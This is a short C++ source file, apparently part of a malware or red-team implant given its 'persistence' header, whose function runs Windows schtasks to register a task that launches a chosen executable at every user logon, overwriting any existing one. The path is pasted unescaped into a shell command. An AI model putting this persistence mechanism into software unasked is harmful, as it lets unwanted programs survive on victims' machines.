#include "persistence.hpp"
#include <cstdlib>

bool task_install(const std::string& path)
{
    std::string cmd =
        "cmd /c schtasks /create /sc ONLOGON "
        "/tn \"" TASK_NAME "\" "
        "/tr \"\\\"" + path + "\\\"\" "
        "/f";

    int res = system(cmd.c_str());

    return (res == 0);
}